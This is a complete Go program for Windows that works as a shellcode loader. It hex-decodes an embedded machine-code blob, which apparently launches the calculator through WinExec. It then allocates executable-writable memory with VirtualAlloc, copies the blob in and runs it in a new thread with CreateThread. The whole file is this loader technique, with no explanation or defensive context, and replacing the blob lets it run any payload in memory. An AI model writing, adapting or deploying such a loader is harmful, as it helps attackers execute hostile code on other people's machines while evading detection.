// +build windows
package main

import (
	"encoding/hex"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {
	shellcode, err := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if err != nil {
		log.Fatal(err)
	}
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	CreateThread := kernel32.NewProc("CreateThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), 0x3000, 0x40)
	RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	thread, _, _ := CreateThread.Call(0, 0, addr, 0, 0, 0)
	WaitForSingleObject.Call(thread, 0xFFFFFFFF)
}
